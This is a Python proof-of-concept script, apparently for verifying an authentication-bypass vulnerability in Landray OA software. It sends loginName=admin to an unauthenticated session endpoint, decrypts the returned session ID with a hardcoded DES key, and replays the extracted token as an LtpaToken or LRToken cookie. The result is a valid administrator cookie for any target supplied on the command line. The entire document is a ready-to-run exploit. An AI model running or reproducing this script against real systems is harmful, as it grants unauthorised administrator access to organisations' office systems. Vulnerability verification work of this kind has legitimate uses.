#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec
from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
from base64 import b64decode
import requests,re,urllib3
from hashlib import md5
import base64
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def base64_decoding(string):
    string=base64.b64decode(string)
    return string.decode()

def des_decrypt(ciphertext, key):
    # 使用base64解码密文
    ciphertext = b64decode(ciphertext)
    
    # 创建DES解密器对象
    cipher = DES.new(key, DES.MODE_ECB)
    
    # 解密密文并移除填充
    plaintext = unpad(cipher.decrypt(ciphertext), DES.block_size)
    
    return plaintext.decode('utf-8')

def verify(site):
    url=site+'/api/sys-authentication/loginService/getLoginSessionId.html'
    headers={
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    body='loginName=admin'
    response1=requests.post(url,body,headers=headers,timeout=8,verify=False)
    # print(response.text)
    enc_data=response1.json()['sessionId']
    des_data=base64_decoding(enc_data)
    data=des_decrypt(des_data,b'kmssSecu')
    #print(data)
    token=data.split('id=')[1]
    tokenname_list=['LtpaToken','LRToken']
    for tokenname in tokenname_list:
        url=site+'/sys'
        cookie = tokenname+'='+token
        headers={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
        'Cookie': cookie
        }
        response2=requests.get(url,headers=headers,timeout=8,verify=False,allow_redirects=False)
        if 'anonym' not in response2.headers['Location']:
            return cookie
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 landray-oa-getLoginSessionId-login-bypass.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，Cookie 为：", info)
    else:
        print("[-]漏洞不存在")
